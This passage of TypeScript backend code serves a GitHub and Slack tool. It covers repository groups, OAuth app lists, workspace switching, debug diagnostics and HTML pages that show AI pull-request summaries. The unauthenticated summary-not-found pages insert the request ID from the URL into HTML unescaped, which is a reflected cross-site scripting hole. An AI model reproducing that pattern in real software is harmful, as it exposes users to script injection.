  } catch (error) {
    logger.error('Failed to fetch repo groups', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリグループの取得に失敗しました' }, 500);
  }
});

/**
 * リポジトリグループ作成
 */
app.post('/api/repo-groups', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ error: 'D1 is not configured' }, 500);
  }
  try {
    const body = await c.req.json<{
      name: string;
      description?: string;
      colorCode?: string;
      icon?: string;
      slackChannelId?: string;
      repos?: string[];
    }>();

    if (!body.name || body.name.trim() === '') {
      return c.json({ error: 'グループ名は必須です' }, 400);
    }
    if (body.colorCode && !/^#[0-9a-fA-F]{6}$/.test(body.colorCode)) {
      return c.json({ error: '無効なカラーコードです' }, 400);
    }

    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';
    const now = new Date().toISOString();
    const id = crypto.randomUUID();

    const orderRow = await db.prepare(
      'SELECT MAX(display_order) AS max_order FROM repo_groups WHERE workspace_id = ?'
    ).bind(workspaceId).first<{ max_order: number | null }>();
    const displayOrder = (orderRow?.max_order ?? -1) + 1;

    const stmts: D1PreparedStatement[] = [
      db.prepare(
        'INSERT INTO repo_groups (id, workspace_id, name, description, color_code, icon, slack_channel_id, display_order, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
      ).bind(
        id, workspaceId, body.name.trim(),
        body.description ?? '', body.colorCode ?? '#667eea',
        body.icon ?? '', body.slackChannelId ?? '',
        displayOrder, now, now,
      ),
    ];

    const repos = body.repos ?? [];
    for (const repo of repos) {
      stmts.push(
        db.prepare(
          'INSERT INTO repo_group_members (group_id, repo_name, workspace_id, added_at) VALUES (?, ?, ?, ?)'
        ).bind(id, repo, workspaceId, now),
      );
    }

    await db.batch(stmts);

    logger.info('Created repo group', { userId: user.sub, workspaceId, groupId: id, name: body.name });
    return c.json({
      message: 'グループを作成しました',
      group: {
        id,
        name: body.name.trim(),
        description: body.description ?? '',
        colorCode: body.colorCode ?? '#667eea',
        icon: body.icon ?? '',
        slackChannelId: body.slackChannelId ?? '',
        displayOrder,
        repos,
      },
    }, 201);
  } catch (error) {
    logger.error('Failed to create repo group', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリグループの作成に失敗しました' }, 500);
  }
});

/**
 * リポジトリグループ更新
 */
app.patch('/api/repo-groups/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ error: 'D1 is not configured' }, 500);
  }
  const groupId = c.req.param('id');
  try {
    const body = await c.req.json<{
      name?: string;
      description?: string;
      colorCode?: string;
      icon?: string;
      slackChannelId?: string;
      displayOrder?: number;
      repos?: string[];
    }>();

    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';
    const now = new Date().toISOString();

    const updates: string[] = [];
    const values: (string | number)[] = [];
    if (body.name !== undefined) {
      if (body.name.trim() === '') {
        return c.json({ error: 'グループ名は空にできません' }, 400);
      }
      updates.push('name = ?');
      values.push(body.name.trim());
    }
    if (body.description !== undefined) {
      updates.push('description = ?');
      values.push(body.description);
    }
    if (body.colorCode !== undefined) {
      if (!/^#[0-9a-fA-F]{6}$/.test(body.colorCode)) {
        return c.json({ error: '無効なカラーコードです' }, 400);
      }
      updates.push('color_code = ?');
      values.push(body.colorCode);
    }
    if (body.icon !== undefined) {
      updates.push('icon = ?');
      values.push(body.icon);
    }
    if (body.slackChannelId !== undefined) {
      updates.push('slack_channel_id = ?');
      values.push(body.slackChannelId);
    }
    if (body.displayOrder !== undefined) {
      updates.push('display_order = ?');
      values.push(body.displayOrder);
    }

    const stmts: D1PreparedStatement[] = [];

    if (updates.length > 0) {
      updates.push('updated_at = ?');
      values.push(now);
      values.push(workspaceId, groupId);
      stmts.push(
        db.prepare(
          `UPDATE repo_groups SET ${updates.join(', ')} WHERE workspace_id = ? AND id = ?`
        ).bind(...values),
      );
    }

    if (body.repos !== undefined) {
      stmts.push(
        db.prepare(
          'DELETE FROM repo_group_members WHERE group_id = ? AND workspace_id = ?'
        ).bind(groupId, workspaceId),
      );
      for (const repo of body.repos) {
        stmts.push(
          db.prepare(
            'INSERT INTO repo_group_members (group_id, repo_name, workspace_id, added_at) VALUES (?, ?, ?, ?)'
          ).bind(groupId, repo, workspaceId, now),
        );
      }
      if (updates.length === 0) {
        stmts.push(
          db.prepare(
            'UPDATE repo_groups SET updated_at = ? WHERE workspace_id = ? AND id = ?'
          ).bind(now, workspaceId, groupId),
        );
      }
    }

    if (stmts.length === 0) {
      return c.json({ error: '更新するフィールドがありません' }, 400);
    }

    await db.batch(stmts);

    logger.info('Updated repo group', { userId: user.sub, workspaceId, groupId });
    return c.json({ message: 'グループを更新しました', groupId });
  } catch (error) {
    logger.error('Failed to update repo group', {
      userId: user.sub,
      groupId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリグループの更新に失敗しました' }, 500);
  }
});

/**
 * リポジトリグループ削除
 */
app.delete('/api/repo-groups/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ error: 'D1 is not configured' }, 500);
  }
  const groupId = c.req.param('id');
  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    await db.batch([
      db.prepare(
        'DELETE FROM repo_group_members WHERE group_id = ? AND workspace_id = ?'
      ).bind(groupId, workspaceId),
      db.prepare(
        'DELETE FROM repo_groups WHERE id = ? AND workspace_id = ?'
      ).bind(groupId, workspaceId),
    ]);

    logger.info('Deleted repo group', { userId: user.sub, workspaceId, groupId });
    return c.json({ message: 'グループを削除しました', groupId });
  } catch (error) {
    logger.error('Failed to delete repo group', {
      userId: user.sub,
      groupId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリグループの削除に失敗しました' }, 500);
  }
});

// =====================================================
// グループ OAuth App 管理 API
// =====================================================

app.get('/api/repo-groups/:id/oauth-apps', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return c.json({ error: 'D1 is not configured' }, 500);

  const groupId = c.req.param('id');
  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    const rows = await db.prepare(
      'SELECT app_name, app_note, added_at FROM group_oauth_apps WHERE group_id = ? AND workspace_id = ? ORDER BY app_name'
    ).bind(groupId, workspaceId).all();

    return c.json({ apps: rows.results ?? [] });
  } catch (error) {
    logger.error('Failed to get group oauth apps', {
      userId: user.sub, groupId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'OAuth App一覧の取得に失敗しました' }, 500);
  }
});

app.post('/api/repo-groups/:id/oauth-apps', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return c.json({ error: 'D1 is not configured' }, 500);

  const groupId = c.req.param('id');
  try {
    const body = await c.req.json<{ appName?: string; appNote?: string }>();
    const appName = (body.appName ?? '').trim();
    if (!appName) return c.json({ error: 'appName は必須です' }, 400);

    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';
    const now = new Date().toISOString();

    await db.prepare(
      'INSERT OR REPLACE INTO group_oauth_apps (group_id, app_name, app_note, workspace_id, added_at) VALUES (?, ?, ?, ?, ?)'
    ).bind(groupId, appName, (body.appNote ?? '').trim(), workspaceId, now).run();

    logger.info('Added oauth app to group', { userId: user.sub, workspaceId, groupId, appName });
    return c.json({ message: 'OAuth Appを追加しました', appName });
  } catch (error) {
    logger.error('Failed to add oauth app to group', {
      userId: user.sub, groupId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'OAuth Appの追加に失敗しました' }, 500);
  }
});

app.delete('/api/repo-groups/:id/oauth-apps/:appName', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return c.json({ error: 'D1 is not configured' }, 500);

  const groupId = c.req.param('id');
  const appName = decodeURIComponent(c.req.param('appName'));
  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    await db.prepare(
      'DELETE FROM group_oauth_apps WHERE group_id = ? AND app_name = ? AND workspace_id = ?'
    ).bind(groupId, appName, workspaceId).run();

    logger.info('Removed oauth app from group', { userId: user.sub, workspaceId, groupId, appName });
    return c.json({ message: 'OAuth Appを削除しました', appName });
  } catch (error) {
    logger.error('Failed to remove oauth app from group', {
      userId: user.sub, groupId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'OAuth Appの削除に失敗しました' }, 500);
  }
});

app.get('/api/repo-oauth-apps', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return c.json({ error: 'D1 is not configured' }, 500);

  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    const rows = await db.prepare(
      `SELECT m.repo_name, a.app_name, a.app_note, g.name AS group_name, g.color_code
       FROM group_oauth_apps a
       JOIN repo_groups g ON g.id = a.group_id AND g.workspace_id = a.workspace_id
       JOIN repo_group_members m ON m.group_id = a.group_id AND m.workspace_id = a.workspace_id
       WHERE a.workspace_id = ?
       ORDER BY m.repo_name, a.app_name`
    ).bind(workspaceId).all();

    const repoApps: Record<string, Array<{ appName: string; appNote: string; groupName: string; colorCode: string }>> = {};
    for (const row of (rows.results ?? []) as Array<{ repo_name: string; app_name: string; app_note: string; group_name: string; color_code: string }>) {
      if (!repoApps[row.repo_name]) repoApps[row.repo_name] = [];
      repoApps[row.repo_name].push({
        appName: row.app_name,
        appNote: row.app_note,
        groupName: row.group_name,
        colorCode: row.color_code,
      });
    }

    return c.json({ repoApps });
  } catch (error) {
    logger.error('Failed to get repo oauth apps', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリ別OAuth App情報の取得に失敗しました' }, 500);
  }
});

// =====================================================
// AI要約 API
// =====================================================

/**
 * AI要約HTMLビューア (クエリパラメータ方式 — Slackモーダルからの直接リンク用)
 */
app.get('/view', async (c) => {
  const db = c.env.DB;
  if (!db) return c.text('DB not available', 500);

  const requestId = c.req.query('id');
  if (!requestId) return c.text('id parameter is required', 400);
  const referer = c.req.header('referer') ?? '';
  const userAgent = c.req.header('user-agent') ?? '';

  const row = await db.prepare(
    'SELECT request_id, daily_seq, event_date, repo_full_name, pr_number, pr_action, pr_url, model, summary, diff_length, created_at, fallback_used, primary_model FROM ai_summary_log WHERE request_id = ?'
  ).bind(requestId).first() as SummaryModalRow | null;

  if (!row) {
    logger.warn('AI summary row not found in /view', {
      requestId,
      possibleCause: 'webhook_not_configured_or_summary_not_stored_in_this_worker',
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/view',
      requestId,
      found: false,
      issueCode: 'summary_not_found',
      issueDetail: 'ai_summary_log row not found',
      referer,
      userAgent,
    });
    return c.html(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>AI要約が見つかりません</title></head><body style="font-family:system-ui,sans-serif;max-width:800px;margin:2rem auto;padding:0 1rem">
<h1>AI要約が見つかりません</h1>
<p>Request ID: <code>${requestId}</code></p>
<p>このワーカーの D1 に要約レコードがありません。Webhook の送信先設定が別ワーカーを向いている場合や、要約保存前に通知だけ行われたケースで発生します。</p>
</body></html>`, 404);
  }

  try {
    await db.prepare(
      'UPDATE ai_summary_log SET view_count = view_count + 1 WHERE request_id = ?'
    ).bind(requestId).run();
  } catch (error) {
    logger.warn('Failed to increment ai_summary_log.view_count in /view', {
      requestId,
      error: error instanceof Error ? error.message : String(error),
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/view',
      requestId,
      found: true,
      issueCode: 'view_count_update_failed',
      issueDetail: error instanceof Error ? error.message : String(error),
      referer,
      userAgent,
    });
  }

  let reviews: { results?: unknown[] } = { results: [] };
  try {
    reviews = await db.prepare(
      'SELECT rating, reviewer_type, reviewer_name, comment, created_at FROM ai_summary_reviews WHERE summary_request_id = ? ORDER BY created_at DESC'
    ).bind(requestId).all();
  } catch (error) {
    logger.warn('Failed to load ai_summary_reviews in /view (fallback to empty reviews)', {
      requestId,
      error: error instanceof Error ? error.message : String(error),
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/view',
      requestId,
      found: true,
      issueCode: 'review_query_failed',
      issueDetail: error instanceof Error ? error.message : String(error),
      referer,
      userAgent,
    });
  }

  await recordAiSummaryLinkAccess(db, {
    route: '/view',
    requestId,
    found: true,
    issueCode: 'ok',
    referer,
    userAgent,
  });

  const escHtml = (value: unknown) => String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
  const summaryText = row.summary ? sanitizeBoxDrawing(row.summary) : '(要約なし)';
  const prLink = row.pr_url ? `<a href="${escHtml(row.pr_url)}">PR #${row.pr_number}</a>` : `PR #${row.pr_number ?? '?'}`;

  const reviewRows = (reviews.results ?? []).map((r: any) =>
    `<tr><td>${escHtml(r.rating)}</td><td>${escHtml(r.reviewer_name ?? '')}</td><td>${escHtml(r.comment ?? '')}</td><td>${escHtml(r.created_at ?? '')}</td></tr>`
  ).join('');

  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>AI要約 #${row.daily_seq}</title>
<style>body{font-family:system-ui,sans-serif;max-width:800px;margin:2rem auto;padding:0 1rem;background:#1a1a2e;color:#e0e0e0}
a{color:#6cb4ee}h1{font-size:1.4rem;color:#f0f0f0}h2{color:#d0d0d0}table{border-collapse:collapse;width:100%}th,td{border:1px solid #3a3a5c;padding:8px;text-align:left}
th{background:#2a2a4a;color:#c0c0c0}td{background:#22223a}pre{background:#0d0d1a;color:#d4d4d4;padding:1rem;border-radius:6px;overflow-x:auto;white-space:pre-wrap;border:1px solid #3a3a5c}
.meta{display:grid;grid-template-columns:auto 1fr;gap:0.25rem 1rem;margin:1rem 0}.meta dt{font-weight:bold;color:#9090b0;text-align:right;white-space:nowrap}.meta dd{margin:0;color:#d0d0d0}
details{margin-bottom:1rem}summary{cursor:pointer;font-size:1.4rem;font-weight:bold;color:#f0f0f0;padding:0.5rem 0}summary:hover{color:#6cb4ee}</style>
</head><body>
<details><summary>AI要約 #${row.daily_seq} (${escHtml(row.event_date)}) — ${escHtml(row.repo_full_name ?? '(不明)')} ${prLink}</summary>
<dl class="meta">
<dt>リポジトリ</dt><dd>${escHtml(row.repo_full_name ?? '(不明)')}</dd>
<dt>PR</dt><dd>${prLink}</dd>
<dt>アクション</dt><dd>${escHtml(row.pr_action ?? '')}</dd>
<dt>モデル</dt><dd>${escHtml(row.model ?? '(不明)')}</dd>
<dt>モデル切替</dt><dd>${escHtml(describeModelSwitch(row))}</dd>
<dt>Diff長</dt><dd>${row.diff_length ?? 0} 文字</dd>
<dt>日時</dt><dd>${escHtml(row.created_at)}</dd>
<dt>Request ID</dt><dd style="font-size:0.85rem">${escHtml(row.request_id)}</dd>
</dl>
</details>
<h2>要約</h2>
<pre>${escHtml(summaryText)}</pre>
${reviewRows ? `<details><summary>D1上のイメージ</summary><table><thead><tr><th>評価</th><th>レビュアー</th><th>コメント</th><th>日時</th></tr></thead><tbody>${reviewRows}</tbody></table></details>` : ''}
<footer style="margin-top:2rem;padding-top:1rem;border-top:1px solid #3a3a5c;font-size:0.85rem;color:#707090">AI要約時に生成された Request ID (UUIDv4) は <code>/ai-summary/{id}</code> でHTMLページとしてリクエストできます。</footer>
</body></html>`;

  return c.html(html);
});

/**
 * AI要約詳細ページ (パスパラメータ方式 — /view へのフォールバック)
 */
app.get('/ai-summary/:id', async (c) => {
  const db = c.env.DB;
  if (!db) return c.text('DB not available', 500);

  const requestId = c.req.param('id');
  const referer = c.req.header('referer') ?? '';
  const userAgent = c.req.header('user-agent') ?? '';
  const row = await db.prepare(
    'SELECT request_id, daily_seq, event_date, repo_full_name, pr_number, pr_action, pr_url, model, summary, diff_length, created_at, fallback_used, primary_model FROM ai_summary_log WHERE request_id = ?'
  ).bind(requestId).first() as SummaryModalRow | null;

  if (!row) {
    logger.warn('AI summary row not found in /ai-summary/:id', {
      requestId,
      possibleCause: 'webhook_not_configured_or_summary_not_stored_in_this_worker',
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/ai-summary/:id',
      requestId,
      found: false,
      issueCode: 'summary_not_found',
      issueDetail: 'ai_summary_log row not found',
      referer,
      userAgent,
    });
    return c.html(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>AI要約が見つかりません</title></head><body style="font-family:system-ui,sans-serif;max-width:800px;margin:2rem auto;padding:0 1rem">
<h1>AI要約が見つかりません</h1>
<p>Request ID: <code>${requestId}</code></p>
<p>このワーカーの D1 に要約レコードがありません。Webhook の送信先設定が別ワーカーを向いている場合や、要約保存前に通知だけ行われたケースで発生します。</p>
</body></html>`, 404);
  }

  try {
    await db.prepare(
      'UPDATE ai_summary_log SET view_count = view_count + 1 WHERE request_id = ?'
    ).bind(requestId).run();
  } catch (error) {
    logger.warn('Failed to increment ai_summary_log.view_count in /ai-summary/:id', {
      requestId,
      error: error instanceof Error ? error.message : String(error),
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/ai-summary/:id',
      requestId,
      found: true,
      issueCode: 'view_count_update_failed',
      issueDetail: error instanceof Error ? error.message : String(error),
      referer,
      userAgent,
    });
  }

  let reviews: { results?: unknown[] } = { results: [] };
  try {
    reviews = await db.prepare(
      'SELECT rating, reviewer_type, reviewer_name, comment, created_at FROM ai_summary_reviews WHERE summary_request_id = ? ORDER BY created_at DESC'
    ).bind(requestId).all();
  } catch (error) {
    logger.warn('Failed to load ai_summary_reviews in /ai-summary/:id (fallback to empty reviews)', {
      requestId,
      error: error instanceof Error ? error.message : String(error),
    });
    await recordAiSummaryLinkAccess(db, {
      route: '/ai-summary/:id',
      requestId,
      found: true,
      issueCode: 'review_query_failed',
      issueDetail: error instanceof Error ? error.message : String(error),
      referer,
      userAgent,
    });
  }

  await recordAiSummaryLinkAccess(db, {
    route: '/ai-summary/:id',
    requestId,
    found: true,
    issueCode: 'ok',
    referer,
    userAgent,
  });

  const escHtml = (value: unknown) => String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
  const summaryText = row.summary ? sanitizeBoxDrawing(row.summary) : '(要約なし)';
  const prLink = row.pr_url ? `<a href="${escHtml(row.pr_url)}">PR #${row.pr_number}</a>` : `PR #${row.pr_number ?? '?'}`;

  const reviewRows = (reviews.results ?? []).map((r: any) =>
    `<tr><td>${escHtml(r.rating)}</td><td>${escHtml(r.reviewer_name ?? '')}</td><td>${escHtml(r.comment ?? '')}</td><td>${escHtml(r.created_at ?? '')}</td></tr>`
  ).join('');

  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>AI要約 #${row.daily_seq}</title>
<style>body{font-family:system-ui,sans-serif;max-width:800px;margin:2rem auto;padding:0 1rem;background:#1a1a2e;color:#e0e0e0}
a{color:#6cb4ee}h1{font-size:1.4rem;color:#f0f0f0}h2{color:#d0d0d0}table{border-collapse:collapse;width:100%}th,td{border:1px solid #3a3a5c;padding:8px;text-align:left}
th{background:#2a2a4a;color:#c0c0c0}td{background:#22223a}pre{background:#0d0d1a;color:#d4d4d4;padding:1rem;border-radius:6px;overflow-x:auto;white-space:pre-wrap;border:1px solid #3a3a5c}
.meta{display:grid;grid-template-columns:auto 1fr;gap:0.25rem 1rem;margin:1rem 0}.meta dt{font-weight:bold;color:#9090b0;text-align:right;white-space:nowrap}.meta dd{margin:0;color:#d0d0d0}
details{margin-bottom:1rem}summary{cursor:pointer;font-size:1.4rem;font-weight:bold;color:#f0f0f0;padding:0.5rem 0}summary:hover{color:#6cb4ee}</style>
</head><body>
<details><summary>AI要約 #${row.daily_seq} (${escHtml(row.event_date)}) — ${escHtml(row.repo_full_name ?? '(不明)')} ${prLink}</summary>
<dl class="meta">
<dt>リポジトリ</dt><dd>${escHtml(row.repo_full_name ?? '(不明)')}</dd>
<dt>PR</dt><dd>${prLink}</dd>
<dt>アクション</dt><dd>${escHtml(row.pr_action ?? '')}</dd>
<dt>モデル</dt><dd>${escHtml(row.model ?? '(不明)')}</dd>
<dt>モデル切替</dt><dd>${escHtml(describeModelSwitch(row))}</dd>
<dt>Diff長</dt><dd>${row.diff_length ?? 0} 文字</dd>
<dt>日時</dt><dd>${escHtml(row.created_at)}</dd>
<dt>Request ID</dt><dd style="font-size:0.85rem">${escHtml(row.request_id)}</dd>
</dl>
</details>
<h2>要約</h2>
<pre>${escHtml(summaryText)}</pre>
${reviewRows ? `<details><summary>D1上のイメージ</summary><table><thead><tr><th>評価</th><th>レビュアー</th><th>コメント</th><th>日時</th></tr></thead><tbody>${reviewRows}</tbody></table></details>` : ''}
<footer style="margin-top:2rem;padding-top:1rem;border-top:1px solid #3a3a5c;font-size:0.85rem;color:#707090">AI要約時に生成された Request ID (UUIDv4) は <code>/ai-summary/{id}</code> でHTMLページとしてリクエストできます。</footer>
</body></html>`;

  return c.html(html);
});

/**
 * AI要約詳細取得 + view_count インクリメント
 */
app.get('/api/ai-summary/:id', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return c.json({ error: 'DB not available' }, 500);

  const requestId = c.req.param('id');
  const row = await db.prepare(
    'SELECT * FROM ai_summary_log WHERE request_id = ?'
  ).bind(requestId).first();
  if (!row) return c.json({ error: 'Not found' }, 404);

  await db.prepare(
    'UPDATE ai_summary_log SET view_count = view_count + 1 WHERE request_id = ?'
  ).bind(requestId).run();

  const reviews = await db.prepare(
    'SELECT * FROM ai_summary_reviews WHERE summary_request_id = ? ORDER BY created_at DESC'
  ).bind(requestId).all();

  return c.json({ summary: { ...row, view_count: (row.view_count as number ?? 0) + 1 }, reviews: reviews.results ?? [] });
});

/**
 * AI要約レビュー登録
 */
app.post('/api/ai-summary/:id/feedback', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return c.json({ error: 'DB not available' }, 500);

  const requestId = c.req.param('id');
  const body = await c.req.json<{
    rating: string;
    reviewer_type?: string;
    reviewer_name?: string;
    review_model?: string;
    comment?: string;
  }>();

  if (!body.rating || !['good', 'bad'].includes(body.rating)) {
    return c.json({ error: 'rating must be "good" or "bad"' }, 400);
  }

  const existing = await db.prepare(
    'SELECT request_id FROM ai_summary_log WHERE request_id = ?'
  ).bind(requestId).first();
  if (!existing) return c.json({ error: 'Summary not found' }, 404);

  const now = new Date().toISOString();
  const reviewerType = body.reviewer_type || 'human';

  await db.prepare(`
    INSERT INTO ai_summary_reviews
      (summary_request_id, rating, reviewer_type, reviewer_name, review_model, comment, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).bind(
    requestId,
    body.rating,
    reviewerType,
    body.reviewer_name || null,
    body.review_model || null,
    body.comment || null,
    now,
  ).run();

  return c.json({ success: true });
});

/**
 * AI要約 解決フラグ更新
 */
app.post('/api/ai-summary/:id/resolve', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return c.json({ error: 'DB not available' }, 500);

  const requestId = c.req.param('id');
  const body = await c.req.json<{
    resolved: boolean;
    resolution_note?: string;
  }>();

  const existing = await db.prepare(
    'SELECT request_id FROM ai_summary_log WHERE request_id = ?'
  ).bind(requestId).first();
  if (!existing) return c.json({ error: 'Summary not found' }, 404);

  const now = new Date().toISOString();
  const resolved = body.resolved ? 1 : 0;

  await db.prepare(`
    UPDATE ai_summary_log
    SET resolved = ?, resolved_at = ?, resolution_note = ?
    WHERE request_id = ?
  `).bind(
    resolved,
    resolved ? now : null,
    body.resolution_note || null,
    requestId,
  ).run();

  return c.json({ success: true });
});

/**
 * ワークスペース一覧取得
 */
app.get('/api/workspaces', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) {
    return c.json({ workspaces: [], current: null });
  }

  const workspaces = await getUserWorkspaces(c.env.DB, user.sub);
  const current = await getCurrentWorkspace(c.env.DB, user.sub);

  return c.json({
    workspaces,
    current: current ? { workspaceId: current.workspaceId, workspaceName: current.workspaceName, teamId: current.teamId, teamName: current.teamName } : null,
  });
});

/**
 * ワークスペース切り替え
 */
app.post('/api/workspaces/switch', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) {
    return c.json({ error: 'Database not available' }, 500);
  }

  const { workspaceId } = await c.req.json<{ workspaceId: string }>();
  if (!workspaceId || typeof workspaceId !== 'string') {
    return c.json({ error: '無効なワークスペースIDです' }, 400);
  }

  const success = await switchWorkspace(c.env.DB, user.sub, workspaceId);
  if (!success) {
    return c.json({ error: 'ワークスペースの切り替えに失敗しました' }, 403);
  }

  return c.json({ message: 'ワークスペースを切り替えました', workspaceId });
});

/**
 * インストール権限の最新データを返す（ページ読み込み時の差分チェック用）
 */
app.get('/api/repo-permissions', authMiddleware, async (c) => {
  const user = c.get('user');

  // D1 から読み取り（Webhook で保存されたデータ）
  const d1Data = await getInstallationPermissionsFromD1(c.env.DB);
  if (d1Data) {
    return c.json({ permissions: d1Data.permissions, allPermissions: d1Data.allPermissions, source: 'd1' });
  }

  // D1 にデータがない場合は GitHub API にフォールバック
  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (!accessToken) {
    return c.json({ permissions: {} });
  }

  try {
    const installMap = await buildRepoInstallationPermissionsMap(accessToken);
    const result: Record<string, { permissions: Record<string, string>; repositorySelection: string }> = {};
    let allPerms: Record<string, string> | null = null;

    for (const [key, value] of installMap.entries()) {
      if (key.startsWith('__all__')) {
        allPerms = value.permissions;
      } else {
        result[key] = {
          permissions: value.permissions,
          repositorySelection: value.repositorySelection,
        };
      }
    }

    return c.json({ permissions: result, allPermissions: allPerms, source: 'api' });
  } catch (error) {
    logger.warn('Failed to fetch repo installation permissions', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ permissions: {} });
  }
});

// =====================================================
// 診断エンドポイント
// =====================================================

/**
 * D1接続診断（認証が必要）
 */
app.get('/api/debug/d1', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;

  const result: Record<string, unknown> = {
    db_binding_exists: !!db,
    user: user.sub,
  };

  if (!db) {
    return c.json({ ...result, error: 'DB binding is undefined - D1 is not bound' }, 500);
  }

  try {
    // テーブル存在確認
    const tables = await db.prepare(
      "SELECT name FROM sqlite_master WHERE type='table' AND name='user_sessions'"
    ).first();
    result.table_exists = !!tables;

    // カラム確認
    const columns = await db.prepare("PRAGMA table_info(user_sessions)").all();
    result.columns = columns.results?.map((col: Record<string, unknown>) => col.name) ?? [];

    // ユーザーのレコード確認
    const userRecord = await db.prepare(
      'SELECT user_id, timezone, session_duration, last_login_at, current_login_at, updated_at, display_name, CASE WHEN github_access_token IS NOT NULL THEN \'[SET]\' ELSE \'[NULL]\' END as token_status FROM user_sessions WHERE user_id = ?'
    ).bind(user.sub).first();
    result.user_record = userRecord ?? 'NOT FOUND';

    // 全レコード数
    const count = await db.prepare('SELECT COUNT(*) as cnt FROM user_sessions').first<{ cnt: number }>();
    result.total_records = count?.cnt ?? 0;

    // テスト書き込み
    const now = new Date().toISOString();
    try {
      await db.prepare(`
        INSERT INTO user_sessions (user_id, timezone, session_duration, current_login_at, updated_at)
        VALUES (?, 'JST', '1h', ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET updated_at = ?
      `).bind(user.sub, now, now, now).run();
      result.test_write = 'SUCCESS';
    } catch (writeError) {
      result.test_write = 'FAILED';
      result.test_write_error = writeError instanceof Error ? writeError.message : 'Unknown error';
    }

    // テスト書き込み後の確認
    const afterWrite = await db.prepare(
      'SELECT user_id, timezone, session_duration, current_login_at, updated_at FROM user_sessions WHERE user_id = ?'
    ).bind(user.sub).first();
    result.after_test_write = afterWrite ?? 'NOT FOUND';
  } catch (error) {
    result.error = error instanceof Error ? error.message : 'Unknown error';
    result.stack = error instanceof Error ? error.stack : undefined;
  }

  return c.json(result);
});

/**
 * GitHub App インストール権限の診断（認証が必要）
 * GET /user/installations の生レスポンスを確認できる
 */
app.get('/api/debug/installations', authMiddleware, async (c) => {
  const user = c.get('user');
  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (!accessToken) {
    return c.json({ error: 'アクセストークンが保存されていません', user: user.sub });
  }

  const result: Record<string, unknown> = { user: user.sub };

  // Step 1: GET /user/installations
  const diag = await getGitHubUserInstallationsWithDiag(accessToken);
  result.installations_api = {
    status: diag.status,
    error: diag.error,
    total_count: diag.totalCount,
    installation_count: diag.installationCount,
  };

  if (!diag.installations || diag.installations.length === 0) {
    result.installations = [];
    result.repo_permissions = {};
    return c.json(result);
  }

  // Step 2: 各インストールの詳細
  const installDetails: Record<string, unknown>[] = [];
  for (const inst of diag.installations) {
    const detail: Record<string, unknown> = {
      id: inst.id,
      app_id: inst.app_id,
      app_slug: inst.app_slug,
      repository_selection: inst.repository_selection,
      permissions: inst.permissions,
    };

    if (inst.repository_selection !== 'all') {
      const repos = await getGitHubInstallationRepos(accessToken, inst.id);
      detail.repos = repos.map(r => ({ name: r.name, full_name: r.full_name, private: r.private }));
      detail.repo_count = repos.length;
    } else {
      detail.repos = '(all repositories)';
    }

    installDetails.push(detail);
  }
